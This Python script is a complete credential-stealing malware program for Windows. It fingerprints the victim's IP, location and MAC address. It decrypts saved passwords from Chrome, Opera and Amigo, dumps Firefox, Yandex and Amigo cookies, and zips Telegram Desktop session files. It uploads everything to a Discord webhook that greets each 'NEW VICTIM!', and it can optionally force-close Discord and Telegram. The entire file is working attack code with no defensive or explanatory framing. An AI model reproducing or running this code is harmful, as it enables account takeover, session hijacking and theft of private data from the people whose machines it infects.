try:
    import shutil
    import json
    from base64 import b64decode
    from glob import glob
    import win32crypt
    from dhooks import Webhook, Embed, File
    from win32crypt import CryptUnprotectData
    from datetime import datetime
    from Crypto.Cipher import AES
    import os
    import sqlite3
    from uuid import getnode as get_mac
    import re
    from requests import get
    import win32api
    from zipfile import ZipFile
except Exception as e:
    pass

#################################### LOGOUT ###################################################
log_out = 0  # this is log_out for kill process stealer, (discord + telegram). 1 - on, 2 - off
###############################################################################################

################################### Send new victim messsage #############################
hook = Webhook("") # Your webhook id
embed = Embed(
    description='NEW VICTIM!',
    color=0x5CDBF0,
    timestamp='now'  
    )
embed.set_footer(text='Hehe')
hook.send(embed=embed)
##########################################################################################
name_ur_txt = 'google_passwords.txt'
######################################################################## IP ########################################################
ip_info = "################## IP INFO ##################\n\n"
publicip = get('https://api.ipify.org').text # Get public API
ip_info += f"#### ip: {publicip} ####\n"
city = get(f'https://ipapi.co/{publicip}/city').text
ip_info += f"### city: {city} ####\n"
region = get(f'https://ipapi.co/{publicip}/region').text
ip_info += f"### region: {region} ####\n"
postal = get(f'https://ipapi.co/{publicip}/postal').text
ip_info += f"### postal: {postal} ####\n"
timezone = get(f'https://ipapi.co/{publicip}/timezone').text
ip_info += f"### timezone: {timezone} ####\n"
currency = get(f'https://ipapi.co/{publicip}/currency').text
ip_info += f"### currency: {currency} ####\n"
country = get(f'https://ipapi.co/{publicip}/country_name').text
ip_info += f"### country: {country} ####\n"
callcode = get(f"https://ipapi.co/{publicip}/country_calling_code").text
ip_info += f"### callcode: {callcode} ####\n"
vpn = get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
ip_info += f"### proxy: {proxy} ####\n"
mac = get_mac()
ip_info += f"### mac-address: {mac} ####\n"
ip_info += "##########################################"

embed = Embed(
    description=f'{ip_info}',
    color=0x5CDBF0,
    timestamp='now'  
    )
hook.send(embed=embed)
####################################################################################################################################

pathusr = os.path.expanduser('~')
local = os.getenv("LOCALAPPDATA")
temp = os.path.join(local, "Temp")
ttemp = os.path.join(local, "Temp", "tdata")
paths = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\']
path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')

############################ getting master key #########################
def getmasterkey():
    try:
        with open(path, encoding="utf-8") as f:
            load = json.load(f)["os_crypt"]["encrypted_key"]
            master_key = b64decode(load)
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    except:
        pass
#########################################################################

############################ decryotion key #############################
def decryption(buff, key):
    try:
        payload = buff[15:]
        iv = buff[3:15]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        pass
#########################################################################

embed = Embed(
    description=f'Browser Passwords and cookies',
    color=0x5CDBF0,
    timestamp='now'  
    )
hook.send(embed=embed)

##################### Chrome password ####################################
def Chrome():
    text = 'YOUR PASSWORDS\n'
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                            os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                password = result[2]
                login = result[1]
                url = result[0]
                decrypted_pass = decryption(password, getmasterkey())
                text += url + ' | ' + login + ' | ' + decrypted_pass + '\n'
                with open(name_ur_txt, "w", encoding="utf-8") as f:
                    f.write(text)
    except Exception as e:
        pass
###########################################################################

######################## Firefox cookie ########################
def Firefox():
    textf = ''
    textf += 'Firefox Cookies:' + '\n'
    textf += 'URL | COOKIE | COOKIE NAME' + '\n'
    for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
        for name in dirs:
            conn = sqlite3.connect(os.path.join(root, name)+'\\cookies.sqlite')
            cursor = conn.cursor()
            cursor.execute("SELECT baseDomain, value, name FROM moz_cookies")
            data = cursor.fetchall()
            for i in range(len(data)):
                url, cookie, name = data[i]
                textf += url + ' | ' + str(cookie) + ' | ' + name + '\n'    
        break
    return textf
file = open(os.getenv("APPDATA") + '\\firefox_cookies.txt', "w+")
file.write(str(Firefox()) + '\n')
file.close()

cookies = File(os.getenv("APPDATA") + '\\firefox_cookies.txt')
embed = Embed(
    description=f'Firefox Cookies',
    color=0x5CDBF0,
    timestamp='now'  
    )
hook.send(embed=embed, file=cookies)

################################################################

######################## Opera passwords ########################
def Opera():
    texto = 'Passwords Opera:' + '\n'
    texto += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
        shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                texto += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\pass_opera.txt', "w+")
file.write(str(Opera()) + '\n')
file.close()

cookies = File(os.getenv("APPDATA") + '\\pass_opera.txt')
embed = Embed(
    description=f'Opera Passwords',
    color=0x5CDBF0,
    timestamp='now'  
    )
hook.send(embed=embed, file=cookies)

###################################################################

######################## Yandex Cookies ########################
def Yandex():
    texty = 'YANDEX Cookies:' + '\n'
    texty += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute("SELECT * from cookies")
        for result in cursor.fetchall():
            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
            name = result[2]
            url = result[1]
            texty += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return texty
file = open(os.getenv("APPDATA") + '\\yandex_cookies.txt', "w+")
file.write(str(Yandex()) + '\n')
file.close()

cookies = File(os.getenv("APPDATA") + '\\yandex_cookies.txt')
embed = Embed(
    description=f'Yandex Cookies',
    color=0x5CDBF0,
    timestamp='now'  
    )
hook.send(embed=embed, file=cookies)

####################################################################

########################## Amigo ###############################

def Amigo():
   textam = 'Passwords Amigo:' + '\n'
   textam += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textam += url + ' | ' + login + ' | ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\amigo_pass.txt', "w+")
file.write(str(Amigo()) + '\n')
file.close()

cookies = File(os.getenv("APPDATA") + '\\amigo_pass.txt')
embed = Embed(
    description=f'Amigo Passwords',
    color=0x5CDBF0,
    timestamp='now'  
    )
hook.send(embed=embed, file=cookies)

def Amigo_c():
   textamc = 'Cookies Amigo:' + '\n'
   textamc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textamc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textamc

file = open(os.getenv("APPDATA") + '\\amigo_cookies.txt', "w+")
file.write(str(Amigo_c()) + '\n')
file.close()

cookies = File(os.getenv("APPDATA") + '\\amigo_cookies.txt')
embed = Embed(
    description=f'Amigo Cookies',
    color=0x5CDBF0,
    timestamp='now'  
    )
hook.send(embed=embed, file=cookies)
#################################################################

################################# Telegram Session ###############################
def finddir(path):
    for root, dirs, files in os.walk(path):
        for name in dirs:
            if name == "Telegram Desktop":
                found = os.path.join(root, name)
                if os.path.exists(found + '\\Telegram.exe'):
                    return found
                else:
                    pass

def getFileProperties(fname):
    props = {'FileVersion': None}
    try:
        fixedInfo = win32api.GetFileVersionInfo(fname, '\\')
        props['FileVersion'] = "%d.%d.%d.%d" % (fixedInfo['FileVersionMS'] / 65536,
                fixedInfo['FileVersionMS'] % 65536, fixedInfo['FileVersionLS'] / 65536,
                fixedInfo['FileVersionLS'] % 65536)
    except Exception as e:
        pass
    return props

def send_session_files(path):
    version = getFileProperties(os.path.join(path[:-5],"Telegram.exe"))["FileVersion"]
    for root, dirs, files in os.walk(path):
        for dir in dirs:
            if dir[0:15] == "D877F783D5D3EF8":
                mapsdir = os.path.join(path, dir)
                try:
                    os.mkdir(os.path.join(ttemp, dir))
                except:
                    pass
                if os.path.exists(os.path.join(root,dir,'maps')):
                    shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp,dir,"maps")))
            elif dir[0:15] == "A7FDF864FBC10B7":
                mapsdir = os.path.join(path, dir)
                try:
                    os.mkdir(os.path.join(ttemp, dir))
                except:
                    pass
                if os.path.exists(os.path.join(root, dir, 'maps')):
                    shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp, dir, "maps")))
            elif dir[0:15] == "F8806DD0C461824":
                mapsdir = os.path.join(path, dir)
                try:
                    os.mkdir(os.path.join(ttemp, dir))
                except:
                    pass
                if os.path.exists(os.path.join(root, dir, 'maps')):
                    shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp, dir, "maps")))
        for file in files:
            if file[0:15] == "D877F783D5D3EF8":
                pathd877 = os.path.join(path, file)
                shutil.copy2(pathd877,(os.path.join(ttemp,file)))
            elif file[0:15] == "A7FDF864FBC10B7":
                pathd877 = os.path.join(path, file)
                shutil.copy2(pathd877,(os.path.join(ttemp,file)))
            elif file[0:15] == "F8806DD0C461824":
                pathd877 = os.path.join(path, file)
                shutil.copy2(pathd877,(os.path.join(ttemp,file)))
            elif file == "key_datas":
                pathkey = os.path.join(path, file)
                shutil.copy2(pathkey, (os.path.join(ttemp, file)))

    with ZipFile(os.path.join(temp,'tdata.zip'), 'w') as zipObj:
        for folderName, subfolders, filenames in os.walk(ttemp):
            for filename in filenames:
                filePath = os.path.join(folderName, filename)
                zipObj.write(filePath)
    file = File(open(os.path.join(temp, 'tdata.zip'), 'rb'), name='tgdata.zip')
    embed = Embed(
        description=f'Telegram data\nversion: {version}',
        color=0x5CDBF0,
        timestamp='now'  
    )
    hook.send(embed=embed)
    hook.send(file=file)

##################################################################################

####################################### Logout ###################################
def logout_windows(bool):
    if bool:
        try:
            os.system('taskkill /f /im discord.exe')
            os.system('taskkill /f /im telegram.exe')
        except Exception as e:
            pass
    else:
        pass

##################################################################################

##################################################################################
def send_txt():
    try:
        file = File(name_ur_txt, name='Google_Password.txt')
        embed = Embed(
            description=f'Google Chrome Password',
            color=0x5CDBF0,
            timestamp='now'  
            )
        hook.send(embed=embed, file=file)
        os.remove(name_ur_txt)
    except Exception as e:
        pass
###################################################################################

def main():
    try:
        if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
            tddir = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\')
            tdata_path = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata')
            send_session_files(tdata_path)
        for i in paths:
            found = finddir(i)
            if found != None and found != (pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
                tddir = found
                tdata_path = (os.path.join(tddir, "tdata"))
                send_session_files(tdata_path)
        embed = Embed(
        description=f'User path: {pathusr}',
        color=0x5CDBF0,
        timestamp='now'  
        )
        hook.send(embed=embed)
        Chrome()
        send_txt()
        logout_windows(log_out)
    except Exception as e:
        pass


if __name__ == '__main__':
    main()
